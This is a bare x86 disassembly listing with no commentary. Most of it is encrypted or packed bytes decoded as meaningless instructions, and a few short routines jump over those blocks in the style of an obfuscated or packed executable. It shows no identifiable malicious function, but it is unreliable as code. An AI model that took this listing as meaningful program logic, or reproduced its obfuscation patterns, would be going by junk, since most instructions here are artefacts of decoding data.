  40996b:	mov    esp,0xdcd47d7a
  409970:	fistp  DWORD PTR [edx]
  409972:	xchg   edx,eax
  409973:	xchg   esp,eax
  409974:	(bad)  [esi+edx*1-0x43eaa262]
  40997b:	xchg   edi,eax
  40997c:	repnz mov esi,0x49e28508
  409982:	xchg   edi,eax
  409983:	pop    ebp
  409984:	out    0xc8,eax
  409986:	cmp    al,0xdb
  409988:	sar    BYTE PTR [edx],1
  40998a:	or     DWORD PTR [ebx+0x29],0xe4fe357c
  409991:	xor    eax,0xd2db202a
  409996:	mov    edi,0xa9c5ca69
  40999b:	not    BYTE PTR [esi]
  40999d:	sbb    ah,BYTE PTR [ebx+esi*1]
  4099a0:	jbe    0x4099c7
  4099a2:	fld    QWORD PTR [ebx]
  4099a4:	(bad)  [eax]
  4099a6:	inc    edi
  4099a7:	in     al,0x99
  4099a9:	pushf  
  4099aa:	cmp    eax,0x30da3d9c
  4099af:	mov    ebx,0x21ff5b40
  4099b4:	shl    BYTE PTR [esi+0x4f],cl
  4099b7:	imul   ebp,DWORD PTR [ebp+esi*2-0x2a],0x34a2a5c2
  4099bf:	or     BYTE PTR [esi],bh
  4099c1:	or     eax,0x5e5f0801
  4099c6:	pop    ebx
  4099c7:	leave  
  4099c8:	ret    
  4099c9:	push   ebp
  4099ca:	mov    ebp,esp
  4099cc:	sub    esp,0x44
  4099cf:	push   edi
  4099d0:	sub    DWORD PTR ds:0x42fe8a,0x50c
  4099da:	mov    eax,DWORD PTR [ebp+0xc]
  4099dd:	sbb    DWORD PTR ds:0x42e21c,edx
  4099e3:	mov    DWORD PTR [ebp-0x10],eax
  4099e6:	mov    eax,ds:0x42e397
  4099eb:	mov    edi,DWORD PTR ds:0x42e3a7
  4099f1:	sub    eax,edi
  4099f3:	imul   eax,DWORD PTR [eax+edi*1]
  4099f7:	mov    eax,DWORD PTR [ebp+0x8]
  4099fa:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  409a01:	neg    edx
  409a03:	mov    DWORD PTR [ebp-0x20],0xf89c8530
  409a0a:	mov    edi,DWORD PTR ds:0x42e89c
  409a10:	mov    edi,DWORD PTR [edi]
  409a12:	or     DWORD PTR ds:0x42e224,edi
  409a18:	mov    edx,DWORD PTR [ebp+0x8]
  409a1b:	add    edi,0x5c8e
  409a21:	mov    DWORD PTR [ebp-0x40],eax
  409a24:	adc    DWORD PTR ds:0x42fdf9,0x342b
  409a2e:	mov    eax,0x7510855
  409a33:	xor    edi,ecx
  409a35:	xor    edx,eax
  409a37:	mov    edi,DWORD PTR ds:0x42e21c
  409a3d:	sbb    DWORD PTR ds:0x42e7eb,edi
  409a43:	mov    ecx,0x32729c
  409a48:	jmp    0x409e06
  409a4d:	arpl   WORD PTR [edx-0x6f],si
  409a50:	cmc    
  409a51:	xchg   ecx,eax
  409a52:	cmc    
  409a53:	arpl   WORD PTR [edx-0x1f],si
  409a56:	pop    ebp
  409a57:	das    
  409a58:	mul    DWORD PTR ds:0x874e5b5e
  409a5e:	in     al,dx
  409a5f:	jo     0x409ad1
  409a61:	lahf   
  409a62:	jge    0x409ad4
  409a64:	jo     0x409abc
  409a66:	jmp    0x409a80
  409a68:	inc    esi
  409a69:	clc    
  409a6a:	jne    0x409a5c
  409a6c:	sub    DWORD PTR [esi],ebx
  409a6e:	pop    esi
  409a6f:	retf   
  409a70:	mov    dl,0xda
  409a72:	(bad)  
  409a73:	lods   eax,DWORD PTR ds:[esi]
  409a74:	sbb    eax,0xb7c56efa
  409a79:	(bad)  
  409a7a:	xor    DWORD PTR [ebx-0x47],edx
  409a7d:	pop    eax
  409a7e:	imul   esi,ebp,0xffffffa1
  409a81:	or     ecx,DWORD PTR [edi+0x5a]
  409a84:	popf   
  409a85:	xchg   DWORD PTR [esi],eax
  409a87:	sbb    DWORD PTR [eax+0x5719846b],edx
  409a8d:	in     eax,dx
  409a8e:	mov    ch,0xa
  409a90:	jmp    0x409b08
  409a92:	mov    bl,0x8a
  409a94:	pop    edi
  409a95:	xchg   BYTE PTR [esi+0x72bcacbd],dl
  409a9b:	outs   dx,DWORD PTR ds:[esi]
  409a9c:	stc    
  409a9d:	add    BYTE PTR [edi-0x30],ch
  409aa0:	dec    edi
  409aa1:	hlt    
  409aa2:	fnsave [edx+0x17]
  409aa5:	inc    esp
  409aa6:	mov    esp,DWORD PTR [eax+0xd96b493]
  409aac:	or     eax,0xcbe071ef
  409ab1:	in     al,0xc3
  409ab3:	ins    DWORD PTR es:[edi],dx
  409ab4:	pop    eax
  409ab5:	fwait
  409ab6:	mov    esp,0x226d0949
  409abb:	mov    bl,0xba
  409abd:	data16 jo 0x409b39
  409ac0:	call   FWORD PTR [ebx+ebx*4]
  409ac3:	lds    edx,FWORD PTR [eax+ebp*1+0x4baba8ad]
  409aca:	cmp    bh,al
  409acc:	mov    ds:0x6f60e38d,eax
  409ad1:	jnp    0x409b00
  409ad3:	mov    edi,0xbcc12d81
  409ad8:	xor    ah,dh
  409ada:	and    esp,DWORD PTR [esi+0x44]
  409add:	xchg   esi,eax
  409ade:	jnp    0x409aa1
  409ae0:	mov    edi,0xb1740bf8
  409ae5:	aas    
  409ae6:	pop    ss
  409ae7:	jmp    0x409ac1
  409ae9:	sbb    edx,DWORD PTR [edi]
  409aeb:	mov    bh,0xc1
  409aed:	stos   BYTE PTR es:[edi],al
  409aee:	adc    eax,0x4745c7c1
  409af3:	adc    edx,0x779203fb
  409af9:	mov    edx,DWORD PTR [edx+0x750e03d5]
  409aff:	adc    BYTE PTR [ecx+0x61cc09c],bl
  409b05:	adc    dl,BYTE PTR [ebp+0x43]
  409b08:	call   0x814e:0x3fdfeffe
  409b0f:	push   ebx
  409b10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409b11:	stos   DWORD PTR es:[edi],eax
  409b12:	mov    ecx,0x70ad6524
  409b17:	dec    ecx
  409b18:	cmp    esp,DWORD PTR [eax]
  409b1a:	sub    al,0x9f
  409b1c:	pop    ebp
  409b1d:	hlt    
  409b1e:	or     bh,bl
  409b20:	xchg   ebx,eax
  409b21:	fwait
  409b22:	sub    ah,bl
  409b24:	leave  
  409b25:	pusha  
  409b26:	jg     0x409b68
  409b28:	stos   BYTE PTR es:[edi],al
  409b29:	and    DWORD PTR ds:0xb76574d8,ecx
  409b2f:	sbb    al,0xbc
  409b31:	inc    esp
  409b32:	cmp    ecx,DWORD PTR [edi+0x6b14a73a]
  409b38:	out    dx,al
  409b39:	cli    
  409b3a:	jno    0x409b64
  409b3c:	mov    eax,ds:0x8c342ad5
  409b41:	retf   0xdd89
  409b44:	mov    edi,0x59ff25c5
  409b49:	mov    al,0xbd
  409b4b:	adc    eax,0x9b15b01d
  409b50:	cmc    
  409b51:	dec    ecx
  409b52:	in     al,dx
  409b53:	jp     0x409ae6
  409b55:	fidiv  DWORD PTR [edi+0x74]
  409b58:	popf   
  409b59:	mov    ebx,0x287590b0
  409b5e:	(bad)  
  409b60:	mov    ebx,0x8115abc7
  409b65:	pop    ss
  409b66:	add    al,0x19
  409b68:	inc    esi
  409b69:	adc    BYTE PTR [eax-0x3b110774],ch
  409b6f:	jge    0x409b45
  409b71:	and    eax,0xbc55b69c
  409b76:	fiadd  WORD PTR [esi-0xe]
  409b79:	enter  0x66dc,0x65
  409b7d:	cdq    
  409b7e:	in     eax,dx
  409b7f:	sub    esi,DWORD PTR [ebp-0x76c4e5a8]
  409b85:	rol    bl,cl
  409b87:	lea    ebx,[esp+eiz*2]
  409b8a:	xor    eax,0x28f9a1ba
  409b8f:	add    edx,ecx
  409b91:	mov    edx,0x56143823
  409b96:	call   0x5a916be0
  409b9b:	pop    ecx
  409b9c:	mov    BYTE PTR [esi+0x20ca5539],0x46
  409ba3:	cmp    eax,0x787b2318
  409ba8:	dec    ebx
  409ba9:	(bad)  
  409baa:	sbb    al,0x97
  409bac:	add    edx,DWORD PTR [esp+ecx*8+0x141a8abb]
  409bb3:	push   ecx
  409bb4:	(bad)
  409bb7:	cmp    eax,0x9b70db1d
  409bbc:	adc    al,0xab
  409bbe:	sti    
  409bbf:	add    eax,0x9ccca1f0
  409bc4:	xor    DWORD PTR ds:0xa3581a4d,esp
  409bca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bcb:	dec    edi
  409bcc:	cld    
  409bcd:	popa   
  409bce:	je     0x409b6d
  409bd0:	(bad)  [esi]
  409bd2:	push   ds
  409bd3:	jecxz  0x409c36
  409bd5:	push   ds
  409bd6:	test   DWORD PTR [ebp+0x44326ed5],ebx
  409bdc:	pop    eax
  409bdd:	call   0x3391878
  409be2:	ret    0x361e
  409be5:	push   es
  409be6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409be7:	push   edi
  409be8:	xor    eax,DWORD PTR [edi]
  409bea:	mov    esi,0xb1b9c3e4
  409bef:	mov    cl,0x1f
  409bf2:	ins    BYTE PTR es:[edi],dx
  409bf3:	scas   eax,DWORD PTR es:[edi]
  409bf4:	sbb    BYTE PTR [ebx+ebx*1-0x180a55fb],0x30
  409bfc:	fmulp  st(3),st
  409bfe:	xchg   ecx,eax
  409bff:	int3   
  409c00:	mov    WORD PTR [edi-0x6e],ss
  409c03:	jp     0x409bf3
  409c05:	jnp    0x409b8d
  409c07:	jmp    0x6e85e623
  409c0c:	(bad)  
  409c0e:	mov    bh,0x5d
  409c10:	mov    cl,0x18
  409c12:	sub    cl,BYTE PTR [ebx]
  409c14:	fldenv [ebx-0x4ec73498]
  409c1a:	jp     0x409c68
  409c1c:	pop    ecx
  409c1d:	push   esp
  409c1e:	arpl   WORD PTR [edi-0x16],di
  409c21:	adc    ecx,DWORD PTR [ebx+0x7]
  409c24:	cmp    eax,0xacd0ef7d
  409c29:	sub    ah,BYTE PTR [ebx+edi*4-0x59]
  409c2d:	retf   
  409c2e:	dec    ebx
  409c2f:	fild   WORD PTR [ebx]
  409c31:	pop    ebp
  409c32:	imul   eax,DWORD PTR [edx+0x65],0x5d30d08c
  409c39:	cli    
  409c3a:	push   esp
  409c3b:	sahf   
  409c3c:	ja     0x409c9d
  409c3e:	popf   
  409c3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c40:	in     al,dx
  409c41:	lods   al,BYTE PTR ds:[esi]
  409c42:	shl    BYTE PTR [edx+eax*2],cl
  409c45:	fcomp  DWORD PTR [edx+ebx*1]
  409c48:	jge    0x409cb5
  409c4a:	inc    eax
  409c4b:	xchg   ebp,eax
  409c4c:	je     0x409c1c
  409c4e:	lods   al,BYTE PTR ds:[esi]
  409c4f:	jmp    0x742f:0xe5418fb2
  409c56:	xor    bh,BYTE PTR [edi+edx*2-0x364887c5]
  409c5d:	mov    ebp,DWORD PTR [ecx-0x10]
  409c60:	jbe    0x409ca5
  409c62:	jg     0x409cd6
  409c64:	or     dl,BYTE PTR [ebp+0x7e40330b]
  409c6a:	call   0x3b1bea14
  409c6f:	sbb    ebx,DWORD PTR [ebx+0x5415bbd2]
  409c75:	mov    ds:0x1b59dabf,eax
  409c7a:	inc    ebx
  409c7b:	out    dx,eax
  409c7c:	call   0x822b:0x5b5ce535
  409c83:	in     eax,0x99
  409c85:	sar    DWORD PTR [ebp+0x68],0x2e
  409c89:	push   ds
  409c8a:	or     BYTE PTR [esi-0x1effccf5],0xd5
  409c91:	int    0x8a
  409c93:	sbb    eax,0x31560084
  409c98:	adc    BYTE PTR [ecx+0x56],bl
  409c9b:	mov    BYTE PTR [esi-0x22e1369b],ah
  409ca1:	and    ebp,DWORD PTR [edx]
  409ca3:	js     0x409c59
  409ca5:	lock mov esi,0xa576189a
  409cab:	mov    ds:0xd35d88bc,al
  409cb0:	fst    QWORD PTR [ebp-0x19f28c3f]
  409cb6:	cmp    eax,0x2fd2ce2d
  409cbb:	ret    
  409cbc:	or     ebx,DWORD PTR [eax+0x65]
  409cbf:	nop
  409cc0:	(bad)  
  409cc1:	jne    0x409ccd
  409cc3:	rcr    DWORD PTR [edx-0x30],cl
  409cc6:	js     0x409d0f
  409cc8:	call   0x65da106e
  409ccd:	jp     0x409cc7
  409ccf:	xchg   BYTE PTR [ecx],al
  409cd1:	pop    ds
  409cd2:	dec    ebx
  409cd3:	pop    esp
  409cd4:	lods   eax,DWORD PTR ds:[esi]
  409cd5:	cmp    eax,0xdf91141b
  409cda:	sti    
  409cdb:	test   al,0xb0
  409cdd:	lahf   
  409cde:	dec    ecx
  409cdf:	mov    ch,dl
  409ce1:	and    DWORD PTR [ecx-0x38],ecx
  409ce4:	cmp    eax,0x724143a6
  409ce9:	nop
  409cea:	idiv   ebp
  409cec:	dec    DWORD PTR [ebx]
  409cee:	(bad)  
  409cef:	cmp    cl,BYTE PTR [edi+0x4]
  409cf2:	aaa    
  409cf3:	aam    0x40
  409cf5:	outs   dx,BYTE PTR ds:[esi]
  409cf6:	dec    ebx
  409cf7:	mov    ds:0x8adeecd1,al
  409cfc:	sbb    eax,DWORD PTR [esi-0x4a]
  409cff:	add    cl,BYTE PTR [ebx]
  409d01:	adc    eax,0xc70d273
  409d06:	in     eax,0x4f
  409d08:	mov    ah,BYTE PTR [ecx+ecx*8+0x28]
  409d0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d0d:	pop    ss
  409d0e:	pop    edx
  409d0f:	jne    0x409d8c
  409d11:	cmp    eax,0x5c37cea2
  409d16:	mov    WORD PTR ds:0x954d989,?
  409d1c:	jbe    0x409cf0
  409d1e:	idiv   DWORD PTR [ecx]
  409d20:	js     0x409d55
  409d22:	and    BYTE PTR [esi-0x4a],bl
  409d25:	push   es
  409d26:	cmp    eax,0xe0a28d25
  409d2b:	das    
  409d2c:	mov    edi,0x4d7f62a9
  409d31:	inc    edx
  409d32:	sbb    al,bh
  409d34:	dec    eax
  409d35:	pop    ds
  409d36:	xchg   ebx,eax
  409d37:	(bad)
  409d3a:	jne    0x409d71
  409d3c:	mov    al,0x83
  409d3e:	fisubr WORD PTR [ebx]
  409d40:	jp     0x409dbd
  409d42:	push   0xffffffd6
  409d44:	mov    edi,0x250c2418
  409d49:	int3   
  409d4a:	mov    bh,0x0
  409d4c:	or     al,0x18
  409d4e:	xchg   esp,eax
  409d4f:	mov    bl,0x45
  409d51:	inc    esp
  409d52:	daa    
  409d53:	jecxz  0x409da0
  409d55:	push   ss
  409d56:	jg     0x409d6a
  409d58:	and    esi,DWORD PTR [edx]
  409d5a:	aaa    
  409d5b:	out    0xf6,al
  409d5d:	std    
  409d5e:	and    edx,DWORD PTR [ecx+0x23]
  409d61:	call   0x9bf3490b
  409d66:	ffree  st(7)
  409d68:	test   al,0x28
  409d6a:	fistp  QWORD PTR [ebx+edi*2+0x4f]
  409d6e:	std    
  409d6f:	in     eax,dx
  409d70:	sub    ch,BYTE PTR [edx]
  409d72:	or     al,0x3d
  409d74:	cmp    eax,0x6f713513
  409d79:	loopne 0x409d0b
  409d7b:	or     eax,DWORD PTR [ecx+0x1]
  409d7e:	cli    
  409d7f:	or     eax,DWORD PTR [eax-0x42206fe7]
  409d85:	not    DWORD PTR [edi-0x7a52b6e8]
  409d8b:	icebp  
  409d8c:	das    
  409d8d:	add    ebp,DWORD PTR [esi+0x64acb008]
  409d93:	cmp    dl,BYTE PTR [edx+0x78503b97]
  409d99:	and    esp,DWORD PTR [esi-0x76]
  409d9c:	ret    
  409d9d:	sbb    dl,BYTE PTR [edx]
  409d9f:	lods   eax,DWORD PTR ds:[esi]
  409da0:	sub    BYTE PTR [edi+edx*1],0xdb
  409da4:	les    ebx,FWORD PTR [eax+0x3dfd06ea]
  409daa:	mov    al,0x6d
  409dac:	and    DWORD PTR [ebx-0x2eda88de],edx
  409db2:	inc    edi
  409db3:	push   edx
  409db4:	nop
  409db5:	lds    ebp,FWORD PTR [eax]
  409db7:	aas    
  409db8:	inc    ebp
  409db9:	fsub   QWORD PTR [esp+edx*2-0x45]
  409dbd:	jle    0x409dd2
  409dbf:	mov    bl,0xdf
  409dc1:	in     eax,dx
  409dc2:	lds    esp,FWORD PTR [eax-0x53]
  409dc5:	repz pop ds
  409dc7:	inc    esp
  409dc8:	pop    esi
  409dc9:	stos   BYTE PTR es:[edi],al
  409dca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409dcb:	out    dx,eax
  409dcc:	mov    esi,0x31753537
  409dd1:	jle    0x409dc7
  409dd3:	or     BYTE PTR [edx-0x3346cef7],0xd4
  409dda:	nop
  409ddb:	mov    eax,ds:0x92cfa050
  409de0:	scas   al,BYTE PTR es:[edi]
  409de1:	jg     0x409de6
  409de3:	jno    0x409daa
  409de5:	repz sub BYTE PTR [ebx+0x3a84c900],ch
  409dec:	outs   dx,BYTE PTR ds:[esi]
  409ded:	ficom  DWORD PTR [edx]
  409def:	retf   0x5a59
  409df2:	cli    
  409df3:	ja     0x409d93
  409df5:	pop    esp
  409df6:	aad    0x29
  409df8:	fadd   QWORD PTR [ebx+0x567fec02]
  409dfe:	je     0x409e05
  409e00:	popf   
  409e01:	adc    ebx,edx
  409e03:	or     al,0xb2
  409e05:	retf   
  409e06:	add    edx,ecx
  409e08:	xor    DWORD PTR ds:0x42fe8a,ecx
  409e0e:	mov    DWORD PTR [ebp-0x8],edx
  409e11:	mov    edx,DWORD PTR [ebp+0x8]
  409e14:	and    edi,DWORD PTR ds:0x42fdf9
  409e1a:	xor    edx,eax
  409e1c:	adc    edi,DWORD PTR ds:0x42e224
  409e22:	add    edx,ecx
  409e24:	mov    DWORD PTR ds:0x42fe82,0x18
  409e2e:	cmp    DWORD PTR ds:0x42fe82,0x0
  409e35:	je     0x409e63
  409e3b:	cmp    DWORD PTR ds:0x42fe82,0x1a
  409e42:	jne    0x409e51
  409e48:	push   DWORD PTR [ebp-0xc]
  409e4b:	call   DWORD PTR ds:0x42e3e3
  409e51:	mov    edi,DWORD PTR ds:0x42fe82
  409e57:	dec    edi
  409e58:	mov    DWORD PTR ds:0x42fe82,edi
  409e5e:	jmp    0x409e2e
  409e63:	mov    DWORD PTR [ebp+0xc],edx
  409e66:	adc    DWORD PTR ds:0x42e803,0x3e25
  409e70:	jmp    0x40a22e
  409e75:	xlat   BYTE PTR ds:[ebx]
  409e76:	mov    edi,0x699269fa
  409e7b:	mul    DWORD PTR [ecx-0x79]
  409e7e:	mov    dh,0xc4
  409e80:	(bad)  
  409e81:	mov    bl,0xfb
  409e83:	rol    BYTE PTR [esi+0x26],0xe8
  409e87:	jo     0x409ef9
  409e89:	lahf   
  409e8a:	jge    0x409efc
  409e8c:	jo     0x409e6f
  409e8e:	mov    WORD PTR [edx+eiz*2+0x14],es
  409e92:	inc    ecx
  409e93:	mov    bl,0x6e
  409e95:	(bad)  
  409e96:	and    DWORD PTR gs:[edi-0xd],0xb54301d5
  409e9e:	sahf   
  409e9f:	xor    al,0x18
  409ea1:	jp     0x409e7d
  409ea3:	add    bl,BYTE PTR [edi+0x5ba63389]
  409ea9:	repnz popf 
  409eab:	xor    DWORD PTR ds:0xfc17e568,eax
  409eb1:	cmp    BYTE PTR [edx+ebx*4+0x20],0x5c
  409eb6:	sub    eax,0x15a5d0b3
  409ebb:	not    edx
  409ebd:	(bad)  
  409ebe:	fisttp QWORD PTR [edi]
  409ec0:	xchg   ebp,eax
  409ec1:	jo     0x409eb4
  409ec3:	cmp    DWORD PTR [ebp+ecx*1+0x5f],0x5336cc12
  409ecb:	inc    DWORD PTR [eax-0x44294a02]
  409ed1:	out    dx,al
  409ed2:	fist   DWORD PTR [edi]
  409ed4:	jne    0x409ed5
  409ed6:	cmp    al,0x5c
  409ed8:	sbb    edi,esi
  409eda:	sar    DWORD PTR [edi+0x5c],1
  409edd:	mov    esp,0x68fd655a
  409ee2:	sbb    eax,DWORD PTR ss:0x77312fdc
  409ee9:	mov    ds:0xd3333abd,al
  409eee:	mov    ebx,0xf15364bf
  409ef3:	pop    eax
  409ef4:	popf   
  409ef5:	dec    edi
  409ef6:	in     eax,0x3b
  409ef8:	lock mov ah,0x98
  409efb:	dec    esi
  409efc:	inc    edi
  409efd:	cmp    ebx,edx
  409eff:	call   0x12c47c51
  409f04:	jns    0x409ed7
  409f06:	aaa    
  409f07:	xor    eax,edx
  409f09:	ins    BYTE PTR es:[edi],dx
  409f0a:	fwait
  409f0b:	aas    
  409f0c:	jb     0x409ec7
  409f0e:	xchg   edx,eax
  409f0f:	mul    BYTE PTR [eax+edi*4]
  409f12:	test   eax,0xd2a41676
  409f17:	xchg   edx,eax
  409f18:	sbb    eax,0xf4fbd6f6
  409f1d:	jno    0x409ebe
  409f1f:	xor    eax,0x4d1bea9a
  409f24:	stos   DWORD PTR es:[edi],eax
  409f25:	add    eax,0x47ba3cff
  409f2a:	mov    WORD PTR [esi],fs
  409f2c:	repz mov esp,0x117e3e35
  409f32:	lock mov al,0xe8
  409f35:	call   0xb4db:0x259bb264
  409f3c:	lea    edi,[ebp+0x7c1dd21c]
  409f42:	daa    
  409f43:	in     eax,dx
  409f44:	push   ecx
  409f45:	bound  edi,QWORD PTR [esi]
  409f47:	call   0x90eb63f4
  409f4c:	push   edi
  409f4d:	xor    eax,0x1e8c0256
  409f52:	leave  
  409f53:	ret    0x3fb3
  409f56:	call   0xe0b7fec0
  409f5b:	(bad)  
  409f5c:	ins    DWORD PTR es:[edi],dx
  409f5d:	in     eax,0x27
  409f5f:	imul   ebp
  409f61:	jo     0x409fb0
  409f63:	nop
  409f64:	in     al,dx
  409f65:	in     eax,0xf7
  409f67:	cmp    eax,0x1e5e71bc
  409f6c:	pop    es
  409f6d:	sti    
  409f6e:	out    0xc4,eax
  409f70:	inc    edx
  409f71:	shl    DWORD PTR [eax],cl
  409f73:	mov    eax,0x1c171fc8
  409f78:	jle    0x409f06
  409f7a:	dec    edi
  409f7b:	pop    esi
  409f7c:	pop    es
  409f7d:	add    al,0x2b
  409f7f:	mov    eax,ds:0x7e735c38
  409f84:	xlat   BYTE PTR ds:[ebx]
  409f85:	and    al,0xc
  409f87:	or     DWORD PTR [ebx-0x10],0xffffff9a
  409f8b:	pop    ebp
  409f8c:	ret    
  409f8d:	lods   al,BYTE PTR ds:[esi]
  409f8e:	aam    0x68
  409f90:	pop    ebp
  409f91:	scas   al,BYTE PTR es:[edi]
  409f92:	cmc    
  409f93:	adc    BYTE PTR [esi-0x5f],al
  409f96:	adc    esp,DWORD PTR [ecx]
  409f98:	sub    eax,0x6956796b
  409f9d:	jae    0x40a018
  409f9f:	ret    0xd408
  409fa2:	popa   
  409fa3:	inc    esi
  409fa4:	retf   
  409fa5:	or     ecx,eax
  409fa7:	xchg   ebp,eax
  409fa8:	inc    ah
  409faa:	les    edx,FWORD PTR es:[eax]
  409fad:	rol    DWORD PTR [edi+0x73],cl
  409fb0:	call   0x13194fab
  409fb5:	cs leave 
  409fb7:	cmp    eax,0x8f56ad73
  409fbc:	cmp    edx,eax
  409fbe:	sbb    dl,BYTE PTR [eax+0x55]
  409fc1:	mov    al,0xb1
  409fc3:	rol    edx,1
  409fc5:	mov    ds:0x410a9d19,al
  409fca:	fucomip st,st(0)
  409fcc:	gs in  al,0xfb
  409fcf:	retf   0x921
  409fd2:	lods   al,BYTE PTR ds:[esi]
  409fd3:	frstor [edi-0x43]
  409fd6:	pop    ebx
  409fd7:	pop    ss
  409fd8:	inc    edx
  409fd9:	mov    eax,ds:0xd7668e44
  409fde:	sub    al,0x81
  409fe0:	and    edx,esp
  409fe2:	mov    al,ds:0xe26466ad
  409fe7:	add    DWORD PTR [edi],edi
  409fe9:	fucomi st,st(6)
  409feb:	addr16 aam 0x65
  409fee:	pusha  
  409fef:	arpl   WORD PTR [ecx-0x7a],dx
  409ff2:	jg     0x40a065
  409ff4:	popa   
  409ff5:	mov    edx,0x3a4e7f70
  409ffa:	adc    al,0xad
  409ffc:	pop    ss
  409ffd:	test   BYTE PTR [eax+0x20],dh
  40a000:	sub    al,0xb6
  40a002:	cdq    
  40a003:	adc    al,BYTE PTR [si]
  40a006:	add    DWORD PTR [edi+edi*1-0x4a],edx
  40a00a:	adc    eax,0x1048023
  40a00f:	loope  0x40a073
  40a011:	dec    ecx
  40a012:	rcr    ebp,cl
  40a014:	pop    ds
  40a015:	mov    eax,ds:0xa4605827
  40a01a:	push   esi
  40a01b:	pop    ds
  40a01c:	xlat   BYTE PTR ds:[ebx]
  40a01d:	lods   eax,DWORD PTR ds:[esi]
  40a01e:	cmp    eax,0x9376c2c8
  40a023:	sub    ebx,DWORD PTR [edx]
  40a025:	cdq    
  40a026:	js     0x409fe5
  40a028:	push   esi
  40a029:	jle    0x40a006
  40a02b:	dec    edx
  40a02c:	jb     0x409fcb
  40a02e:	mov    ah,0x25
  40a030:	or     eax,0x1ddfd218
  40a035:	cmp    DWORD PTR [edx],eax
  40a037:	sub    bl,BYTE PTR [ebx]
  40a039:	pusha  
  40a03a:	sbb    al,0x95
  40a03c:	lods   eax,DWORD PTR ds:[esi]
  40a03d:	mov    WORD PTR [eax],fs
  40a03f:	inc    ebp
  40a040:	xchg   edx,eax
  40a041:	sub    BYTE PTR [eax],al
  40a043:	retf   
  40a044:	and    BYTE PTR es:[eax+esi*2-0x2cedcb17],dl
  40a04c:	(bad)  
  40a04d:	jnp    0x409fdc
  40a04f:	cmp    al,ch
  40a051:	cmp    ecx,DWORD PTR ds:0x4544f9e6
  40a057:	(bad)  
  40a058:	jmp    0x40a0c1
  40a05a:	lahf   
  40a05b:	cmp    eax,0xe8d74ee6
  40a060:	inc    esi
  40a061:	push   eax
  40a062:	pop    ebp
  40a063:	fdiv   st,st(2)
  40a065:	sbb    DWORD PTR [ebx],esp
  40a067:	in     eax,0xea
  40a069:	cwde   
  40a06a:	sbb    DWORD PTR [edi],ebx
  40a06c:	mov    ecx,0x1e0df93b
  40a071:	sbb    eax,0x31166426
  40a076:	xlat   BYTE PTR ds:[ebx]
  40a077:	cmp    eax,0x7be5f6fa
  40a07c:	mov    eax,edx
  40a07e:	fcom   DWORD PTR [ebx+0x4f9f949b]
  40a084:	rol    BYTE PTR ss:[edi+0x72533cd],1
  40a08b:	add    ebp,DWORD PTR [ebp-0x2c]
  40a08e:	in     eax,0x3
  40a090:	xor    al,0xf8
  40a092:	fwait
  40a093:	pushf  
  40a094:	sub    cl,cl
  40a096:	hlt    
  40a097:	xor    ebx,0x865739f
  40a09d:	neg    ch
  40a09f:	mov    bh,0xba
  40a0a1:	int    0xf9
  40a0a3:	out    dx,eax
  40a0a4:	fistp  DWORD PTR [ecx+ebp*8]
  40a0a7:	in     eax,0x71
  40a0a9:	and    al,0xb
  40a0ab:	addr16 (bad) 
  40a0ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0ae:	in     al,0xa4
  40a0b0:	xchg   DWORD PTR [esi],esi
  40a0b2:	iret   
  40a0b3:	jae    0x40a11a
  40a0b5:	jp     0x40a0b4
  40a0b7:	sub    al,0x32
  40a0b9:	xchg   ebx,eax
  40a0ba:	mov    bh,0x5a
  40a0bc:	pop    eax
  40a0bd:	loope  0x40a0bb
  40a0bf:	popf   
  40a0c0:	out    dx,al
  40a0c1:	sub    dl,BYTE PTR [edi+0x2b]
  40a0c4:	sbb    eax,0x9038046c
  40a0c9:	xor    ch,BYTE PTR [edx]
  40a0cb:	std    
  40a0cc:	mov    dh,0x19
  40a0ce:	pop    esi
  40a0cf:	mov    dh,0xda
  40a0d1:	outs   dx,DWORD PTR ds:[esi]
  40a0d2:	pmulhw mm6,QWORD PTR [ebx+0x0]
  40a0d6:	loopne 0x40a149
  40a0d8:	icebp  
  40a0d9:	sti    
  40a0da:	inc    ecx
  40a0db:	rcl    BYTE PTR [eax],0x7
  40a0de:	xor    DWORD PTR [esi-0x2c8ef0de],edi
  40a0e4:	ror    bh,0x4d
  40a0e7:	addr16 ds mov ecx,0x26d6a021
  40a0ee:	cs xor eax,0xa121aede
  40a0f4:	rol    BYTE PTR [edx+edi*2+0x55],cl
  40a0f8:	add    DWORD PTR [ebp+0x5f],ebx
  40a0fb:	fidiv  DWORD PTR [edi-0x1]
  40a0fe:	lods   eax,DWORD PTR ds:[esi]
  40a0ff:	xchg   esi,eax
  40a100:	std    
  40a101:	scas   al,BYTE PTR es:[edi]
  40a102:	(bad)  
  40a103:	ds mov bl,0xe1
  40a106:	mov    bl,0x49
  40a108:	and    eax,eax
  40a10a:	test   BYTE PTR [esi+0x5a],dh
  40a10d:	nop
  40a10e:	xchg   ecx,eax
  40a10f:	daa    
  40a110:	in     al,0xb0
  40a112:	in     al,0x49
  40a114:	aad    0x75
  40a116:	ds iret 
  40a118:	sti    
  40a119:	nop
  40a11a:	dec    edx
  40a11b:	inc    eax
  40a11c:	xor    al,0x6e
  40a11e:	jle    0x40a186
  40a120:	jmp    0x40a101
  40a122:	cmp    eax,ebp
  40a124:	ret    0x2dce
  40a127:	jp     0x40a13f
  40a129:	xchg   edx,eax
  40a12a:	sub    BYTE PTR [ebx+0x4d],cl
  40a12d:	push   eax
  40a12e:	(bad)  
  40a12f:	outs   dx,BYTE PTR ds:[esi]
  40a130:	stos   BYTE PTR es:[edi],al
  40a131:	mov    cl,0x8
  40a133:	test   DWORD PTR [ebx],esi
  40a135:	sti    
  40a136:	sbb    dl,bh
  40a138:	mov    ds:0xe80e0fc6,al
  40a13d:	pop    ds
  40a13e:	or     eax,0xe2b4c40f
  40a143:	dec    ebx
  40a144:	mov    DWORD PTR [ebx-0x7],esi
  40a147:	ret    
  40a148:	scas   eax,DWORD PTR es:[edi]
  40a149:	inc    edx
  40a14a:	jbe    0x40a103
  40a14c:	in     eax,0x24
  40a14e:	dec    eax
  40a14f:	push   cs
  40a150:	gs and esp,DWORD PTR fs:[ecx+0x54a33460]
  40a158:	inc    edx
  40a159:	xchg   esp,eax
  40a15a:	iret   
